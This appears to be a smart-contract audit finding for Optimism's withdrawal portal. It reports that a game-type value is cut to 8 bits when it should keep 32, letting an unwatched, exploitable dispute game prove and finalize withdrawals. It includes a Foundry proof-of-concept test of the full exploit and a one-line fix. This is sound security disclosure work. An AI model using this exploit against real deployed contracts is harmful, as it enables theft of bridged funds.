Noisy Pewter Woodpecker

high

# Incorrect game type can be proven and finalized due to unsafe cast

## Summary

The `gameProxy.gameType().raw()` conversions used by OptimismPortal2 in the proving and finalization steps incorrectly casts the `gameType` to a `uint8` instead of a `uint32`, which causes mismatched game types to be considered equivalent. In the event that a game is exploitable, this can be used to skirt around the off-chain monitoring to finalize an invalid withdrawal.

## Vulnerability Detail

Each game can be queried for its `gameType`, which is compared to the current `respectedGameType` in the Portal to confirm the game is valid.

GameType is represented as a `uint32`, allowing numbers up to `2 ** 32 - 1`.
```solidity
type GameType is uint32;
```

However, when converting the GameType to an integer type in order to perform comparisons in the proving and finalization process, we unsafely downcase to a `uint8`:
```solidity
function raw(GameType _gametype) internal pure returns (uint8 gametype_) {
    assembly {
        gametype_ := _gametype
    }
}
```

This means that for any `oldGameType % 256 == X`, any `newGameType % 256 == X` will be considered the same game type.

**This has the potential to shortcut the safeguards to allow malicious games to be finalized.**

As is explained in the comments, only games of the current `respectedGameType` will be watched by the off-chain challenger. This is why we do not allow games that pre-date the last update to be finalized:

> // The game must have been created after `respectedGameTypeUpdatedAt`. This is to prevent users from creating
> // invalid disputes against a deployed game type while the off-chain challenge agents are not watching.

However, the watcher will not be watching games where `gameType % 256 == respectedGameType % 256`.

Let's imagine a situation where game type `0` has been deemed unsafe. It is well known that a user can force a `DEFENDER_WINS` state, even when it is not correct.

At a future date, when the current game type is `256`, a user creates a game with `gameType = 0`. It is not watched by the off chain challenger. This game can be used to prove an invalid state, and then finalize their withdrawal, all while not being watched by the off chain monitoring system.

## Proof of Concept

The following proof of concept can be added to  its own file in `test/L1` to demonstrate the vulnerability:
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import { Test } from "forge-std/Test.sol";
import "./OptimismPortal2.t.sol";

contract UnsafeDowncastTest is CommonTest {
    // Reusable default values for a test withdrawal
    Types.WithdrawalTransaction _defaultTx;
    bytes32 _stateRoot;
    bytes32 _storageRoot;
    bytes32 _outputRoot;
    bytes32 _withdrawalHash;
    bytes[] _withdrawalProof;
    Types.OutputRootProof internal _outputRootProof;

    // Use a constructor to set the storage vars above, so as to minimize the number of ffi calls.
    function setUp() public override {
        super.enableFaultProofs();
        super.setUp();

        _defaultTx = Types.WithdrawalTransaction({
            nonce: 0,
            sender: alice,
            target: bob,
            value: 100,
            gasLimit: 100_000,
            data: hex""
        });
        // Get withdrawal proof data we can use for testing.
        (_stateRoot, _storageRoot, _outputRoot, _withdrawalHash, _withdrawalProof) =
            ffi.getProveWithdrawalTransactionInputs(_defaultTx);

        // Setup a dummy output root proof for reuse.
        _outputRootProof = Types.OutputRootProof({
            version: bytes32(uint256(0)),
            stateRoot: _stateRoot,
            messagePasserStorageRoot: _storageRoot,
            latestBlockhash: bytes32(uint256(0))
        });

        // Fund the portal so that we can withdraw ETH.
        vm.deal(address(optimismPortal2), 0xFFFFFFFF);
    }

    function testWrongGameTypeSucceeds() external {
        // we start with respected gameType == 256
        vm.prank(superchainConfig.guardian());
        optimismPortal2.setRespectedGameType(GameType.wrap(256));

        // create a game with gameType == 0, which we know is exploitable
        FaultDisputeGame game = FaultDisputeGame(
            payable(
                address(
                    disputeGameFactory.create(
                        GameType.wrap(0), Claim.wrap(_outputRoot), abi.encode(uint(0xFF))
                    )
                )
            )
        );

        // proving works, even though gameType is incorrect
        vm.warp(block.timestamp + 1);
        optimismPortal2.proveWithdrawalTransaction({
            _tx: _defaultTx,
            _disputeGameIndex: disputeGameFactory.gameCount() - 1,
            _outputRootProof: _outputRootProof,
            _withdrawalProof: _withdrawalProof
        });

        // warp beyond the game duration and resolve the game
        vm.warp(block.timestamp + 4 days);
        game.resolveClaim(0);
        game.resolve();

        // warp another 4 days so withdrawal can be finalized
        vm.warp(block.timestamp + 4 days);

        // finalizing works, even though gameType is incorrect
        uint beforeBal = bob.balance;
        optimismPortal2.finalizeWithdrawalTransaction(_defaultTx);
        assertEq(bob.balance, beforeBal + 100);
    }
}
```

## Impact

The user is able to prove and finalize their withdrawal against a game that is not being watched and is known to be invalid. This would allow them to prove arbitrary withdrawals and steal all funds in the Portal.

## Code Snippet

https://github.com/sherlock-audit/2024-02-optimism-2024/blob/main/optimism/packages/contracts-bedrock/src/dispute/lib/LibUDT.sol#L117-L126

https://github.com/sherlock-audit/2024-02-optimism-2024/blob/main/optimism/packages/contracts-bedrock/src/L1/OptimismPortal2.sol#L260-L261

https://github.com/sherlock-audit/2024-02-optimism-2024/blob/main/optimism/packages/contracts-bedrock/src/L1/OptimismPortal2.sol#L497-L500

## Tool used

Manual Review

## Recommendation

```diff
- function raw(GameType _gametype) internal pure returns (uint8 gametype_) {
+ function raw(GameType _gametype) internal pure returns (uint32 gametype_) {
      assembly {
          gametype_ := _gametype
      }
}
```
